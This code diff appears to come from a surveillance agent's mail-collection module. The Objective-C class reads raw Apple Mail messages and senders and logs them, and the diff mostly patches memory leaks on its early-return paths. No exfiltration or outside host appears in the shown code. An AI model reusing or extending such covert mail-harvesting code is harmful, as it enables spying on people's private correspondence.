@@ -141,7 +141,6 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
     }
     
     [pool release];
-    return;
 }
 
 - (void) _getMail
@@ -152,6 +151,7 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
     
     if (![appleMail isRunning])
     {
+        [pool release];
         return;
     }
     
@@ -164,6 +164,8 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
         if (![appleMail isRunning])
         {
             [self _setMarkup]; // save markup and return
+            [inner release];
+            [pool release];
             return;
         }
         // retrieve mail addr associated to the account
@@ -178,6 +180,9 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
             if (![appleMail isRunning])
             {
                 [self _setMarkup]; // save markup and return
+                [inner2 release];
+                [inner release];
+                [pool release];
                 return;
             }
             // retrieve messages
@@ -191,11 +196,19 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                 {
                     // save markup and return
                     [self _setMarkup];
+                    [inner3 release];
+                    [inner2 release];
+                    [inner release];
+                    [pool release];
                     return;
                 }
                 if (![appleMail isRunning])
                 {
                     [self _setMarkup]; // save markup and return
+                    [inner3 release];
+                    [inner2 release];
+                    [inner release];
+                    [pool release];
                     return;
                 }
                 // take a bunch of data
@@ -203,6 +216,10 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                 if (![appleMail isRunning])
                 {
                     [self _setMarkup]; // save markup and return
+                    [inner3 release];
+                    [inner2 release];
+                    [inner release];
+                    [pool release];
                     return;
                 }
                 NSInteger msgSize = msg.messageSize;
@@ -210,6 +227,10 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                 if (![appleMail isRunning])
                 {
                     [self _setMarkup]; // save markup and return
+                    [inner3 release];
+                    [inner2 release];
+                    [inner release];
+                    [pool release];
                     return;
                 }
                 NSString *msgId = msg.messageId;
@@ -220,15 +241,21 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                     // verify size range
                     if(msgSize <= size)
                     {
+                        /*
                         if (![appleMail isRunning])
                         {
                             [self _setMarkup]; // save markup and return
                             return;
                         }
                         NSString *rawMail = msg.source;
+                         */
                         if (![appleMail isRunning])
                         {
                             [self _setMarkup]; // save markup and return
+                            [inner3 release];
+                            [inner2 release];
+                            [inner release];
+                            [pool release];
                             return;
                         }
                         NSString *sender = msg.sender;
@@ -237,6 +264,16 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                         if(obj == nil)
                         {
                             // there's no markup
+                            if (![appleMail isRunning])
+                            {
+                                [self _setMarkup]; // save markup and return
+                                [inner3 release];
+                                [inner2 release];
+                                [inner release];
+                                [pool release];
+                                return;
+                            }
+                            NSString *rawMail = msg.source;
                             [markup setObject:msgId forKey:key];
                             [self _writeLog:rawMail andSender:sender];
                         }
@@ -247,6 +284,16 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
                             // the msg and save markup
                             if ([obj isEqualToString:msgId] == NO)
                             {
+                                if (![appleMail isRunning])
+                                {
+                                    [self _setMarkup]; // save markup and return
+                                    [inner3 release];
+                                    [inner2 release];
+                                    [inner release];
+                                    [pool release];
+                                    return;
+                                }
+                                NSString *rawMail = msg.source;
                                 [markup setObject:msgId forKey:key];
                                 [self _writeLog:rawMail andSender:sender];
                             } // else we do nothing
@@ -342,9 +389,6 @@ static __m_MAgentMessages *sharedAgentMessages = nil;
 
 - (BOOL)stop
 {
-#ifdef DEBUG_MESSAGES
-    infoLog(@"dentro stop agent messages.");
-#endif
 
     int internalCounter = 0;
     
